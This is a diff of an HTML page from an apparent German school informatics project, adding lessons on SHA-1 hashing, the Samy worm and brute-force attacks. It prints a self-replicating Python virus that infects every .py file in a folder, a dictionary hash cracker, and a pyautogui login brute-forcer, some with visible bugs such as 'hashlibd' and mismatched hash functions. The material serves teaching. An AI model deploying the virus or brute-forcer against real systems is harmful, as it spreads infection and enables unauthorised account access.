@@ -21,16 +21,73 @@
                 <button class="button-right button_code" onclick="window.open('https://github.com/nicmach/Informatik_Projekt')"><i class="arrow-right"></i></button>
             </span>
         </div>
-        <p class="header">Something about hashing</p>
-        <pre>
-            <code>import customtkinter
-                import hashlib
-                from urllib.request import urlopen
-                from termcolor import colored
-            </code>
-        </pre>
+        <p class="header">Hashing</p>
         <p class="text-white">
             Hashing bezeichnet die Umwandlung einer Zeichenfolge in einen normalerweise kürzeren, numerischen Wert oder Schlüssel mit fester Länge. Der numerische Wert ist der Hashwert und eine andere Darstellung der ursprünglichen Zeichenfolge. Hashing wird zum Indizieren und Abrufen von Elementen in einer Datenbank verwendet. 
+            <br><br>Die NSA, auch bekannt als National Security Agency, ist eine US-amerikanische Regierungsorganisation, die sich hauptsächlich mit der Überwachung und dem Schutz der nationalen Sicherheit beschäftigt. Eine wichtige Rolle spielte die NSA auch bei der Entwicklung von kryptographischen Algorithmen, die zur Verschlüsselung von Daten und zur Sicherung von Online-Kommunikation eingesetzt werden. <br> Einer dieser Algorithmen ist der Secure Hash Algorithm 1 (SHA-1), der von der NSA im Jahr 1993 entwickelt wurde. SHA-1 ist ein kryptographischer Hash-Algorithmus, der verwendet wird, um eine eindeutige digitale Signatur für eine Menge von Daten zu erzeugen. Es wurde als Standard-Algorithmus für digitale Signaturen, Authentifizierung und Integrität in zahlreichen Anwendungen eingesetzt, darunter auch in der SSL/TLS-Verschlüsselung von Websites. <br> Allerdings wurde im Jahr 2005 eine <a href="https://en.wikipedia.org/wiki/SHA-1">Schwäche in SHA-1</a> entdeckt (siehe <a href="https://en.wikipedia.org/wiki/Collision_attack">Collision-Attack</a>), die es theoretisch möglich machte, eine Kollision, also zwei unterschiedliche Datenmengen mit derselben Hash-Signatur zu erzeugen. Dies bedeutete, dass SHA-1 nicht mehr sicher genug war, um in bestimmten Anwendungen eingesetzt zu werden, insbesondere bei der Verschlüsselung von vertraulichen Daten. <br> Seitdem hat die NSA die Entwicklung neuer kryptographischer Algorithmen vorangetrieben, die sicherer sind als SHA-1. Insbesondere wurde SHA-2 entwickelt, ein neuer Satz von kryptographischen Hash-Algorithmen, die als Ersatz für SHA-1 empfohlen wurden.<br> In der Folgezeit haben viele Organisationen ihre Systeme aktualisiert und auf SHA-2 umgestellt, um sicherzustellen, dass ihre Daten vor Angriffen geschützt sind. Trotzdem ist es wichtig zu beachten, dass die NSA auch weiterhin an der Entwicklung neuer Algorithmen arbeitet, um sicherzustellen, dass die nationalen Sicherheitsinteressen gewahrt werden und die Online-Kommunikation sicher bleibt.
+            <br><br> Da Unsere Informationen also stark von Hashing und anderen Formen der Kryptographie abhängig sind, ist es notwendig zumindest die Grundlagen zu verstehen. Wir schauen uns im Folgenden dafür, ein Hash Cracker etwas genauer an (der Code ist über den Button oben rechts zu erreichen).
+        </p>
+        <p class="subheader">Hash Cracker</p>
+        <pre>
+            <code>
+import customtkinter
+import hashlibd
+from urllib.request import urlopen
+from termcolor import colored
+            </code>
+        </pre>
+        <p class="text-white"> Zunächst importieren wir einige Programmierbibliotheken, die für die Funktionalität notwendig sind. Nur hashlibd ist dabei für die eigentlichen Funktionen nötig, die anderen sind lediglich für das Interface oder erfüllen andere sekundäre Aufgaben.</p>
+        <pre>
+            <code>
+def create_hash(password):
+    with open('passwords.txt','a') as password_file:
+        password_file.write(password + '\n')
+
+    hash_obj_2=hashlib.sha1()
+    hash_obj_2.update(password.encode())
+    print('sha1: ',hash_obj_2.hexdigest())
+            </code>
+        </pre>
+        <p class="text-white">Im obigen Code sieht man wie zunächst eine Datei mit dem Namen passwords.txt geöffnet wird, in der das angegebene Password gespeichert wird. Danach wird ein Password, bei Nutzung der Anwendung vom Nutzer einzugeben, mittels verschiedener Hash-Funktionen codiert.</p>
+        <pre>
+            <code>
+def crack_hash(hash):
+
+    try:
+        with open('passwords.txt','r') as password_file:
+            password_list = str(password_file.read())
+        for password in password_list.split('\n'):
+            guess = hashlib.sha256(bytes(password,'utf-8')).hexdigest()
+            if guess == hash:
+                print(colored('The password is: '+str(password),'green'))
+                entry_2.delete(0, customtkinter.END)
+                entry_2.insert(0, f"Password: {password}")
+
+                if save_file.get() == 1:
+                    f = open("hash.txt", "a")
+                    f.write('Hash: ' + str(hash) + '\n')
+                    f.write('Password: ' + str(guess) + '\n')
+
+                break
+            elif guess != hash:
+                continue
+            else:
+                print(colored('The password does not matched in the list…','red'))
+    except Exception as e:
+        print('There was a problem: %s' % (e))
+            </code>
+        </pre>
+        <p class="text-white">In der Funktion crack_hash öffnet das Programm die Datei passwords.txt, welche eine Liste von häufigen Passwörtern enthält. Es erstellt dann die Hashes dieser Passwörter und gleicht diese mit dem eingegebenen Hash ab. Stimmt der Hash überein gibt das Programm das gefundene Passwort aus, damit wurde der Hash entschlüsselt und das entsprechende Passwort ist nun bekannt.</p>
+        <p class="subheader">Weitere Informationen</p>
+        <p class="text-white">
+            Es gibt viele Arten Hashes zu entschlüsseln, der hier gezeigt Weg ist einer, der, sofern der Hash bekannt ist, effektiv ist. Darüber hinaus gibt es auch diverse Möglichkeiten Hashes zum Einloggen zu nutzen, ohne diesen dafür überhaupt entschlüsselnzu müssen.
+            <br><br> Für Interessierte sind hier einige Resourcen verlinkt:
+            
+            <ul>
+                <br><li class="text-white"><a href="https://de.wikipedia.org/wiki/John_the_Ripper">John the Ripper</a> - Eine Password-Cracking Software, die frei verfügbar ist.</li>
+                <br><li class="text-white"><a href="https://www.techtarget.com/searchsecurity/definition/pass-the-hash-attack"> Pass the hash attack</a> - Ein Vorgehen, bei dem ein Angreifer einen Hash nutzen kann, um sich, ohne diesen zu entschlüsseln, in dem entsprechenden Authentifizierungsystem einzuloggen.</li>
+                <br><li class="text-white"><a href="https://www.amazon.de/-/en/Simon-Singh/dp/0385495323">Codes</a> - Ein Buch von Simon Singh über die Geschichte der Kryptographie.</li>
+            </ul>
         </p>
     </div>
     <div id="divBeverly" class="right-half">
@@ -45,18 +102,76 @@
                 <button class="button-right button_code" onclick="window.open('https://github.com/nicmach/Informatik_Projekt')"><i class="arrow-right"></i></button>
             </span>
         </div>
-        <p class="header">Something about hashing</p>
+        <p class="header">Self replicating viruses</p>
+        <p class="text-white">MySpace war eine beliebte Social-Media-Plattform, die in den 2000er Jahren sehr erfolgreich war und es Benutzern ermöglichte, Profile zu erstellen, Inhalte zu teilen und mit anderen Nutzern zu interagieren. Im Jahr 2005 trat ein junger Hacker namens Samy Kamkar in den Vordergrund, als er eine selbstreplizierende Schadsoftware namens "Samy Worm" auf MySpace veröffentlichte.
+
+            <br><br>Der Samy Worm wurde als JavaScript-Code geschrieben und funktionierte, indem er die MySpace-Funktionen ausnutzte, die es Benutzern ermöglichten, ihre Profile anzupassen. Sobald ein Benutzer das Profil eines infizierten Kontos besuchte, wurde der Wurm automatisch auf sein Profil kopiert, wodurch er sich selbst verbreitete. Innerhalb weniger Stunden hatte der Wurm Tausende von MySpace-Profilen infiziert und verändert.
+            
+            <br><br>Obwohl der Samy Worm nur dazu gedacht war, als eine Art "Streich" zu dienen, hatte er dennoch schwerwiegende Auswirkungen. MySpace musste die gesamte Plattform herunterfahren, um die Ausbreitung des Wurms zu stoppen, und das Unternehmen musste erhebliche Ressourcen aufwenden, um die Schäden zu beheben. Der Vorfall diente als wichtige Lektion für Unternehmen und Benutzer, um sich der potenziellen Auswirkungen von Cyberangriffen bewusst zu sein und ihre Sicherheitspraktiken entsprechend anzupassen.
+
+            <br><br>Bei dem Samy Worm handelt es sich um einen Wurm, eine Subkategorie der Schadsoftware. Ein Wurm kann sich dabei eigenständig verbreiten und sein Schadprogramm ausführen. Ähnlich dazu ist der Virus, welcher sich im Unterschied zum Wurm jedoch an bereits bestehende Programme anhängen muss - er ist also nicht eigenständig. Um die Funktionsweise eines solches Viruses zu verstehen betrachten wir ein Beispiel.</p>
+        <p class="subheader">Beispiel - selbstreplizierender Virus</p>
         <pre>
-            <code>import customtkinter
-                import hashlib
-                from urllib.request import urlopen
-                from termcolor import colored
+            <code>
+# START
+
+import sys 
+import glob
+
+virus_code = []
+
+with open(sys.argv[0], 'r') as f:
+    lines = f.readlines()
+
+self_replicating_part = False
+
+for line in lines:
+    if line == "# START":
+        self_replicating_part = True
+    if not self_replicating_part:
+        virus_code.append(line)
+    if line == "# END\n":
+        break
+    
             </code>
         </pre>
         <p class="text-white">
-            Hashing bezeichnet die Umwandlung einer Zeichenfolge in einen normalerweise kürzeren, numerischen Wert oder Schlüssel mit fester Länge. Der numerische Wert ist der Hashwert und eine andere Darstellung der ursprünglichen Zeichenfolge. Hashing wird zum Indizieren und Abrufen von Elementen in einer Datenbank verwendet. 
+            Im obigen importieren wir zunächst die notwendigen Programmierbibliotheken, die es uns erlauben mit dem System zu interagieren und Datei mittels bestimmter Namesmuster zu finden. Danach öffnen wir die derzeitige Datei, also den Code für den Virus, und lesen die Zeilen aus. Wir speichern jede Zeile von #START bis #END in unserer Variable virus_code[].
         </p>
-    </div>
+        <pre>
+            <code>
+python_files = glob.glob('*.py') + glob.glob('*.pyw')    
+
+for file in python_files:
+    with open(file, 'r') as f:
+        file_code = f.readlines()
+
+    infected = False
+
+    for line in file_code:
+        if line == "# START\n":
+            infected = True
+            break
+
+    if not infected:
+        final_code = []
+        final_code.extend(virus_code)
+        final_code.extend('\n')
+        final_code.extend(file_code)
+        
+        with open(file, 'w') as f:
+            f.writelines(final_code)
+
+def malicious_code():
+    print("Infection succeded")
+
+malicious_code()
+# END
+
+            </code>
+        </pre>
+        <p class="text-white"> Danach finden wir jede Datei, in unserem derzeitigen Ordner, welches auf .py oder .pyw endet. Dies tun wir um alle Python-Dateien mit unserem Virus zu infizieren, so dass diese bei erneuter Ausführung des Virus aktivieren. Um dies zu erreichen überprüfen wir zunächst ob die Datei bereits infiziert ist, ist dies nicht der Fall fügen wir unseren Code am Anfang der Datei ein, so dass er bei der nächsten Ausführung als ersten aufgerufen wird. >Zuletzt rufen wir die Funktion malicious_code auf, welche in diesem Beispiel lediglich 'Infection succeded' ausgibt.</p>
+        </div>
     <div id="divHangzhou" class="right-half">
         <div class="container">
             <span>
@@ -69,16 +184,65 @@
                 <button class="button-right button_code" onclick="window.open('https://github.com/nicmach/Informatik_Projekt')"><i class="arrow-right"></i></button>
             </span>
         </div>
-        <p class="header">Something about hashing</p>
+        <p class="header">Brute-Forcing</p>
+        <p class="text-white">Zwischen dem Oktober und November des Jahres 2015 wurde einer der größten Online Marketplätze der Welt Opfer eines Cyberangriffs.
+            Es handelte sich dabei um TaoBao, das chinesische Equivalent von eBay und in Besitz der Alibaba Group. Ingesamt wurden ca. 20.6 Millionen
+            Accounts kompromitiert, wobei zudem eine Datenbank von 99 Millionen Nutzernamen und Passwörtern erlangt wurde. 
+            Anders als vielleicht zunächst zu erwarten handelte es sich dabei jedoch nicht um einen hochkomplizierten Angriff, obwohl die Vorbereitung
+            für einen Angriff diesen Ausmaßes nicht zu unterschätzen ist, sondern vielmehr um eine Brute-Force Attack. 
+            
+           <br><br> Eine Brute-Force-Attacke ist dabei ein Versuch, ein Passwort oder einen Verschlüsselungscode durch systematisches Ausprobieren aller möglichen Kombinationen von Buchstaben, Zahlen und Symbolen zu knacken. Diese Methode wird oft von Cyberkriminellen verwendet, um unautorisierten Zugang zu einem Benutzerkonto, einer Datenbank oder einem System zu erlangen. Es ist eine zeitintensive und ressourcenintensive Technik, die jedoch erfolgreich sein kann, wenn schwache Passwörter oder Sicherheitslücken vorhanden sind.
+            
+            <br><br> Es gibt diverse Methoden, die in ihrer Natur der Brute-Force-Attacke ähneln, so z.B. die Dictionary-Attack, bei der eine Reihe von Passwörtern, anstatt von komplett zufälligen Anordnung von Buchstaben und Zahlen, ausprobiert werden. Ein Beispiel hierfür schauen wir uns nun exemplarisch an.</p>
+        <p class="subheader">Beispiel - Brute-Force-Script</p>
         <pre>
-            <code>import customtkinter
-                import hashlib
-                from urllib.request import urlopen
-                from termcolor import colored
+            <code>
+                #!/usr/bin/python
+
+import datetime
+import time
+import pyautogui
+
+def textprompt():
+    x = pyautogui.confirm('Click OK to begin then click in the password field. Brute force starts after 5 seconds. Cancel to Exit.')
+    if x == 'Cancel':
+        exit()
+    else:
+        passcrack('passwords.txt')
+
+def passcrack(file_name):
+    word_file = open(file_name,'r')
+    words = word_file.read()
+    word_file.close()
+    word_list = words.split(',')
+    time.sleep(5)
+    for word in word_list[0::]:
+        pyautogui.hotkey('ctrl','a')
+        pyautogui.typewrite(word, interval=0.0001)
+        pyautogui.press('tab', 1)
+        pyautogui.hotkey('ctrl','a')
+        pyautogui.typewrite(word, interval=0.0001)
+        pyautogui.click(button='left')
+        print(word)
+
+textprompt()
             </code>
         </pre>
         <p class="text-white">
-            Hashing bezeichnet die Umwandlung einer Zeichenfolge in einen normalerweise kürzeren, numerischen Wert oder Schlüssel mit fester Länge. Der numerische Wert ist der Hashwert und eine andere Darstellung der ursprünglichen Zeichenfolge. Hashing wird zum Indizieren und Abrufen von Elementen in einer Datenbank verwendet. 
+            Im obigen Code nutzen wir pyautogui, um den Prozess des Eingebens mehrerer Passwörter zu automatisieren. Je nach Anwendung muss dieser Teil angepasst werden. In einem normalen Login-Fenster kann es z.B. ausreichen den Nutzernamen gefolgt von dem Passwort einzugeben und danach die Enter-Taste zu betätigen. Bei anderen Authentifizierungssystemen kann es jedoch weiter Interaktionen mit dem System geben, die mit einbezogen werden müssen. Oft greifen Login-Systeme deswegen auch auf CAPTCHAs (Completely Automated Public Turing test to tell Computers and Humans Apart) zurück, um die Automatisierung solcher Prozesse zu erschweren. 
+In unserem Beispiel muss der Angreifer zunächst das Passwortfeld auswählen, danach muss er seine Maus über das Eingabe/ Enter-Feld navigieren. Danach liest das Skript mehrere Passwörter, aus der Datei passwords.txt, und probiert diese. Gegebenenfalls müssen hier auch diverse Überprüfungen eingefügt werden, um zu überprüfen, ob die Authentifizerung bereits erfolgt ist.
+        </p>
+        <p class="text-white">
+            Wie schon angesprochen gibt es viele Verfahren, die in ihrer Idee der Brute-Force- bzw. der Dictionary-Attack ähneln. Oft unterscheiden sie sich in ihrem Umfang und den genutzten Passwörtern. Weiterhin gibt es auch eine Reihe von Tools, die solche Angriffe erleichtern.
+            <br><br> Für Interessierte sind hier einige Resourcen verlinkt:
+            
+            <ul>
+                <br><li class="text-white"><a href="https://expertinsights.com/insights/the-8-most-common-types-of-password-attacks/">8 Common Password Attacks</a> - Ein kurzer Artikel über die acht häufigsten Password-Angriffe.</li>
+                <br><li class="text-white"><a href="https://www.computerweekly.com/de/definition/Woerterbuchangriff-Dictionary-Attack#:~:text=Ein%20W%C3%B6rterbuchangriff%20verwendet%20eine%20vorausgew%C3%A4hlte,123abc%E2%80%9C%20und%20%E2%80%9E123456%E2%80%9C."> Dictionary-Attack</a> - Mehr Informationen zu Dictionary-Attacks (Wörterbuchangriffen).</li>
+                <br><li class="text-white"><a href="https://www.tecchannel.de/a/brute-force-attacken-auf-passwoerter-die-tools-der-angreifer,431419,3">Hydra</a> - Ein Tool um Authentifizerungsysteme mittels von Brute-Forcing und ähnlichen Methoden zu umgehen.</li>
+                <br><li class="text-white"><a href="https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/">Hydra - Tutorial</a> - Ein praktisches Tutorial zu Hydra.</li>
+                <br><li class="text-white"><a href="https://portswigger.net/support/using-burp-to-brute-force-a-login-page"> BurpSuite </a> - Eine Software für diverse Netzwerk- und Browserverbundene Tests, welches auch für das Bruteforcing von Web-Logins genutzt werden kann.</li>
+            </ul>
         </p>
     </div>
     <div id="divSanFrancisco" class="right-half">
@@ -93,16 +257,14 @@
                 <button class="button-right button_code" onclick="window.open('https://github.com/nicmach/Informatik_Projekt')"><i class="arrow-right"></i></button>
             </span>
         </div>
-        <p class="header">Something about hashing</p>
+        <p class="header">Something Netcat and TCP/UDP</p>
         <pre>
-            <code>import customtkinter
-                import hashlib
-                from urllib.request import urlopen
-                from termcolor import colored
+            <code>
+                Platzhalter
             </code>
         </pre>
         <p class="text-white">
-            Hashing bezeichnet die Umwandlung einer Zeichenfolge in einen normalerweise kürzeren, numerischen Wert oder Schlüssel mit fester Länge. Der numerische Wert ist der Hashwert und eine andere Darstellung der ursprünglichen Zeichenfolge. Hashing wird zum Indizieren und Abrufen von Elementen in einer Datenbank verwendet. 
+            Platzhalter        
         </p>
     </div>
 </body>
